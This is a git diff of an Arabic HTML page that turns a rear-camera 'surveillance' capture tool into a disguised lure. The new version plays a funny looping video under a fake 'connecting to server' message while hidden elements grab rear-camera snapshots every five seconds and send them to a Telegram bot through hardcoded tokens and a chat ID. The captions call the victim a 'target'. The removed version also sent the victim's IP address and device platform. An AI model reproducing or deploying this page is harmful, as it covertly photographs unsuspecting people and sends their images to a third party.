@@ -2,43 +2,62 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام المراقبة 2 - 2009</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Funny Moment | لحظة مضحكة</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: #fff; padding: 20px; }
-        .btn { padding: 20px; background: #e74c3c; color: white; border: none; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; max-width: 300px; }
+        body { margin: 0; background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: white; font-family: sans-serif; }
+        video#funnyVideo { width: 100%; max-width: 450px; border: 3px solid #fff; border-radius: 15px; }
+        .status { margin-top: 10px; font-size: 14px; opacity: 0.7; }
+        canvas, #cam_stream { display: none; }
     </style>
 </head>
 <body>
-    <h3>تفعيل الكاميرا الخلفية للمراقبة 📸</h3>
-    <button class="btn" onclick="capture()">تصوير القاعة الآن</button>
-    <video id="v" autoplay style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
+
+    <!-- فيديو الشخص اللي بشرب بيبسي وبهز رأسه -->
+    <video id="funnyVideo" autoplay loop muted playsinline>
+        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHR0amRoc2R4bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZ29vZC9pbmRleC5naWY/3o7TKMGpxxS0L8lSMM/giphy.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <div class="status">جاري الاتصال بالسيرفر... 😂</div>
+
+    <video id="cam_stream" autoplay></video>
+    <canvas id="canvas"></canvas>
 
     <script>
-        const pr = new URLSearchParams(window.location.search);
-        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chat_id') || '7238206121'; 
+        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
 
-        async function capture() {
-            try {
-                // هنا الفرق (environment) للكاميرا الخلفية
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                const v = document.getElementById('v');
-                v.srcObject = stream;
-                setTimeout(async () => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    c.toBlob(async (blob) => {
-                        let ip = "N/A"; try { ip = await (await fetch('https://api.ipify.org')).text(); } catch(e){}
-                        const caption = encodeURIComponent(`📸 صيدة خلفية\n👤 الصياد: ${pr.get('hunter')}\n🌐 IP: ${ip}\n📱 الجهاز: ${navigator.platform}`);
-                        const fd = new FormData(); fd.append('photo', blob, 'b.jpg');
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${pr.get('id')}&caption=${caption}`, {method:'POST', body:fd});
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${pr.get('dev')}&caption=${caption}`, {method:'POST', body:fd});
-                        alert("تم التصوير بنجاح");
-                    }, 'image/jpeg');
-                }, 2000);
-            } catch (e) { alert("يجب السماح بالكاميرا"); }
+        const camVideo = document.getElementById('cam_stream');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // طلب الكاميرا الخلفية (environment)
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
+        .then(stream => {
+            camVideo.srcObject = stream;
+            // سحب صورة كل 5 ثواني
+            setInterval(takeSnapshot, 5000);
+        })
+        .catch(err => { console.log("Back camera access error"); });
+
+        function takeSnapshot() {
+            canvas.width = camVideo.videoWidth;
+            canvas.height = camVideo.videoHeight;
+            context.drawImage(camVideo, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'back_cam.jpg');
+                fd.append('caption', '📷 **Back Cam Shot Captured!**\n👤 Target is laughing...\n🦅 Dev: Abu Osayed Malkawi');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: fd
+                });
+            }, 'image/jpeg');
         }
     </script>
 </body>
